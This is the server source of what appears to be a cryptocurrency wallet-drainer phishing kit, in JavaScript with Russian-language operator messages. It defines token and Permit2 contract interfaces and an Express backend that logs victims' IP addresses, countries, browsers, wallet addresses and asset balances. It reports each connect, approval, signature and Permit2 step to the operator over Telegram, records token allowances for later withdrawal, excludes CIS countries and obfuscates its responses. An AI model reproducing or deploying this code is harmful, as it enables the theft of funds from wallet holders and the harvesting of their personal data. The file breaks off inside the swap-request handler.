  "stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`),
  'ERC721': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},
  {"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},
  {"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
  {"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]`),
  'PERMIT_2': JSON.parse(`[{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},
  {"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
  'PERMIT_1': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"holder","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"bool","name":"allowed","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]`),
  'PERMIT2_SINGLE': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails","name":"details","type":"tuple"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitSingle","name":"permitSingle","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
  'PERMIT2_BATCH': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails[]","name":"details","type":"tuple[]"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitBatch","name":"permitBatch","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"internalType":"struct IAllowanceTransfer.AllowanceTransferDetails[]","name":"transferDetails","type":"tuple[]"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
};

// ============================================================================= //
// Автор и разработчик не одобряет использование данного ПО в указанных странах
// Удаление какой-либо страны из данного списка СТРОГО ЗАПРЕЩЕНО И НЕ ОДОБРЯЕТСЯ
// ============================================================================= //
const MS_Banned_Countries = [ 'RU', 'BY', 'KZ', 'UZ', 'AZ', 'AM', 'TJ', 'KG' ];
// ============================================================================= //

const bot = new Telegram(MS_Telegram_Token);

const web = express();
web.use(express.json());

web.use(require("cors")());
web.use(require('express-useragent').express());
web.use(express.static('public')); web.use(parser.json({ limit: '50mb' }));
web.use(parser.urlencoded({ limit: '50mb', extended: true }));
web.use((require('express-body-parser-error-handler'))());

let last_free_id = 1;

if (MS_Keep_ID_History && fs.existsSync('ids.dat'))
  last_free_id = parseInt(fs.readFileSync('ids.dat', 'utf-8'));

const free_id = () => {
  last_free_id += 1;
  if (MS_Keep_ID_History)
    fs.writeFileSync('ids.dat', String(last_free_id), 'utf-8');
  return last_free_id - 1;
};

let User_IPs_Pool = {};

setInterval(() => {
  User_IPs_Pool = {};
  for (const address in MS_Verified_Addresses) {
    try {
      if (Math.floor(Date.now() / 1000) - MS_Verified_Addresses[address] > 300) {
        delete MS_Verified_Addresses[address];
      }
    } catch(err) {
      console.log(err);
    }
  }
}, 15 * 60 * 1000);

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

const send_response = async (response, data) => {
  try {
    const encode_key = Buffer.from(String(10 + 256 + 1024 + 2048 + MS_Encryption_Key)).toString('base64');
    const data_encoded = prs(encode_key, Buffer.from(JSON.stringify(data)).toString('base64'));
    return response.status(200).send(data_encoded);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const block_request = async (response) => {
  try {
    return await send_response(response, { status: 'error', error: 'SRV_UNAVAILABLE' });
  } catch(err) {
    console.log(err);
  }
};

const add_record = async (record) => {
  try {
    if (!MS_Enable_API) return;
    if (MS_API_Mode == 1 && record.type != 'asset_sent') return;
    if (MS_API_Mode == 2 && record.type != 'enter_website' && record.type != 'connect_wallet' && record.type != 'asset_sent') return;
    if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
    let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8')), ts = Math.floor(Date.now() / 1000);
    record.ts = ts; API_Data.push(record);
    fs.writeFileSync('API_DATA', JSON.stringify(API_Data), 'utf-8');
  } catch(err) {
    console.log(err);
  }
};

const add_allowance = async (owner, spender, token, chain_id, permit2 = false) => {
  try {
    if (!MS_Allowance_API) return false;
    let allowance_list = [];
    if (fs.existsSync('allowances.dat'))
      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
    for (const allowance of allowance_list) {
      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
        return false;
      }
    }
    allowance_list.push({ owner, spender, token, chain_id, permit2 });
    fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
    return true;
  } catch(err) {
    console.log(err);
  }
};

const update_allowance = async (owner, spender, token, chain_id, permit2 = false, balance = '0') => {
  try {
    if (!MS_Allowance_API) return false;
    let allowance_list = [];
    if (fs.existsSync('allowances.dat'))
      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
    for (let x = (allowance_list.length - 1); x >= 0; x--) {
      const allowance = allowance_list[x];
      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
        allowance_list[x].last_balance = balance;
        fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
        return true;
      }
    }
    return false;
  } catch(err) {
    console.log(err);
  }
};

const remove_allowance = async (owner, spender, token, chain_id, permit2 = false) => {
  try {
    if (!MS_Allowance_API) return false;
    let allowance_list = [];
    if (fs.existsSync('allowances.dat'))
      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
    for (let x = (allowance_list.length - 1); x >= 0; x--) {
      const allowance = allowance_list[x];
      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
        allowance_list.splice(x, 1);
        fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
        return true;
      }
    }
    return false;
  } catch(err) {
    console.log(err);
  }
};

const chain_id_to_name = (chain_id) => {
  switch (chain_id) {
    case 1: return 'Ethereum';
    case 10: return 'Optimism';
    case 56: return 'BNB Smart Chain';
    case 137: return 'Polygon (MATIC)';
    case 250: return 'Fantom';
    case 42161: return 'Arbitrum';
    case 43114: return 'Avalanche';
    default: return 'Unknown Network';
  }
};

const detect_browser = (UA) => {
  try {
    return UA.browser;
  } catch(err) {
    console.log(err);
    return 'Unknown';
  }
};

const detect_OS = (UA) => {
  try {
    return UA.os;
  } catch(err) {
    console.log(err);
    return 'Unknown';
  }
};

const detect_country = async (IP) => {
  try {
    const IP_Data = await axios.get(`http://ip-api.com/json/${IP}`);
    if (IP_Data.data.status == 'success')
      return IP_Data.data.countryCode;
    else return 'UNK';
  } catch(err) {
    console.log(err);
    return 'UNK';
  }
};

const on_enter_website = async (response, data) => {
  try {
    let User_Country = await detect_country(data.IP), User_Browser = detect_browser(data.UA), User_OS = detect_OS(data.UA);
    if (MS_CIS_Protection && MS_Banned_Countries.includes(User_Country.toUpperCase())) return send_response(response, { status: 'error',  error: 'BAD_COUNTRY' });
    add_record({
      type: 'enter_website', domain: data.domain, IP: data.IP, UA: data.UA.source,
      country: User_Country, browser: User_Browser, OS: User_OS, user_id: data.user_id,
      worker_id: data.worker_id || null
    });
    if ((data.chat_data == false && MS_Notifications.enter_website.mode) || (data.chat_data != false && data.chat_data.enter_website != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.enter_website.chat_id : data.chat_data.enter_website;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>👋 Новое посещение вашего сайта</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code> (${User_Country})\n<b>🖥 User Agent:</b> <code>${data.UA.source}</code>\n<b>💾 Система:</b> <code>${User_OS}</code>\n<b>🌍 Браузер:</b> <code>${User_Browser}</code>\n<b>🕐 Время:</b> <code>${data.time}</code>\n<b>👨‍🦰 Пользователь:</b> <code>#user_${data.user_id}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_leave_website = async (response, data) => {
  try {
    add_record({ type: 'leave_website', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.leave_website.mode) || (data.chat_data != false && data.chat_data.leave_website != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.leave_website.chat_id : data.chat_data.leave_website;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>😭 Пользователь #user_${data.user_id} закрыл, либо перезагрузил сайт</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_connect_request = async (response, data) => {
  try {
    if (MS_Protection) {
      if (isNaN(parseInt(data.user_id)) || !Supported_Wallets.includes(data.wallet)) {
        if (!User_IPs_Pool[data.IP]) User_IPs_Pool[data.IP] = {};
        User_IPs_Pool[data.IP]['strange_data'] = Math.floor(Date.now() / 1000) + (10 * 60);
        return block_request(response);
      }
    }
    add_record({ type: 'connect_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, wallet: data.wallet, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.connect_request.mode) || (data.chat_data != false && data.chat_data.connect_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_request.chat_id : data.chat_data.connect_request;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ Запросили подключение у пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>💰 Тип кошелька:</b> <code>${data.wallet}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_connect_cancel = async (response, data) => {
  try {
    add_record({ type: 'connect_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.connect_cancel.mode) || (data.chat_data != false && data.chat_data.connect_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_cancel.chat_id : data.chat_data.connect_cancel;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил подключение</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_connect_success = async (response, data) => {
  try {
    if (MS_Protection) {
      if (isNaN(parseInt(data.user_id)) || !Supported_Wallets.includes(data.wallet) || !data.address.match(/^0x\S{40,40}$/)) {
        if (!User_IPs_Pool[data.IP]) User_IPs_Pool[data.IP] = {};
        User_IPs_Pool[data.IP]['strange_data'] = Math.floor(Date.now() / 1000) + (10 * 60);
        return block_request(response);
      }
    }
    add_record({
      type: 'connect_wallet', domain: data.domain, IP: data.IP, user_id: data.user_id,
      wallet_type: data.wallet, wallet_address: data.address, wallet_network: data.chain_id,
      worker_id: data.worker_id || null
    });
    if ((data.chat_data == false && MS_Notifications.connect_success.mode) || (data.chat_data != false && data.chat_data.connect_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_success.chat_id : data.chat_data.connect_success;
      let User_Country = await detect_country(data.IP);
      await bot.sendMessage(receiver_chat_id, `<b>🦊 Пользователь #user_${data.user_id} подключил кошелёк</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code> (${User_Country})\n\n<b>💰 Тип кошелька:</b> <code>${data.wallet}</code>\n<b>💠 Адрес:</b> <code>${data.address}</code>\n<b>⛓ Текущая сеть:</b> <code>${chain_id_to_name(data.chain_id)}</code>\n\n<i>Производится расчёт баланса, если пользователь не покинет сайт, вы получите уведомление</i>`, {
        parse_mode: 'HTML'
      });
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_check_finish = async (response, data) => {
  try {
    add_record({ type: 'check_results', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, assets: data.assets, balance: data.balance, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.connect_success.mode) || (data.chat_data != false && data.chat_data.connect_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_success.chat_id : data.chat_data.connect_success;
      let assets_native = "", assets_tokens = "", assets_nfts = "";
      for (const asset of data.assets) {
        try {
          if (asset.type == 'NATIVE') {
            assets_native += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
          } else if (asset.type == 'ERC20') {
            assets_tokens += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
          } else if (asset.type == 'ERC721') {
            assets_nfts += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
          }
        } catch(err) {
          console.log(err);
        }
      };
      if (assets_native == "") assets_native = '<i>пусто</i>';
      if (assets_tokens == "") assets_tokens = '<i>пусто</i>';
      if (assets_nfts == "") assets_nfts = '<i>пусто</i>';
      try {
        await bot.sendMessage(receiver_chat_id, `<b>💰 Пользователь #user_${data.user_id} отсканировал кошелек</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Общий баланс кошелька:</b> <code>${data.balance.toFixed(2)}$</code>\n\n<b>Основная монета:</b> ${assets_native}\n\n<b>ERC-20 токены:</b> ${assets_tokens}\n\n<b>NFT:</b> ${assets_nfts}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_chain_request = async (response, data) => {
  try {
    add_record({ type: 'chain_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, current_chain: data.chains[0], suggest_chain: data.chains[1], user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.chain_request.mode) || (data.chat_data != false && data.chat_data.chain_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_request.chat_id : data.chat_data.chain_request;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на смену сети</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>⛓ Текущая сеть:</b> ${chain_id_to_name(data.chains[0])}\n<b>⛓ Новая сеть:</b> ${chain_id_to_name(data.chains[1])}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_chain_success = async (response, data) => {
  try {
    add_record({ type: 'chain_success', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.chain_success.mode) || (data.chat_data != false && data.chat_data.chain_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_success.chat_id : data.chat_data.chain_success;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} сменил сеть</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_chain_cancel = async (response, data) => {
  try {
    add_record({ type: 'chain_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.chain_cancel.mode) || (data.chat_data != false && data.chat_data.chain_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_cancel.chat_id : data.chat_data.chain_cancel;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил смену сети, либо сеть недоступна</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_transfer_cancel = async (response, data) => {
  try {
    add_record({ type: 'transfer_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.transfer_cancel.mode) || (data.chat_data != false && data.chat_data.transfer_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_cancel.chat_id : data.chat_data.transfer_cancel;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил перевод, либо транзакция не прошла</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_approve_cancel = async (response, data) => {
  try {
    add_record({ type: 'approve_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил подтверждение, либо транзакция не прошла</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_cancel = async (response, data) => {
  try {
    add_record({ type: 'sign_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил подпись, либо транзакция не прошла</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_unavailable = async (response, data) => {
  try {
    add_record({ type: 'sign_unavailable', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ Для пользователя #user_${data.user_id} недоступна подпись</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<i>Но без паники, просто его кошелек не поддерживает эту функцию, по возможности предложим ему другой способ...</i>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_request = async (response, data) => {
  try {
    add_record({ type: 'sign_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_request.chat_id : data.chat_data.sign_request;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на подпись</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_swap_request = async (response, data) => {
  try {
    if (data.swapper == 'Permit2') {
      add_record({ type: 'permit2_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, assets: data.list, user_id: data.user_id });
    } else {
      add_record({ type: 'swap_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, assets: data.list, user_id: data.user_id, swapper: data.swapper });
    }
    if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_request.chat_id : data.chat_data.sign_request;
      try {
        let assets_str = '';
        for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
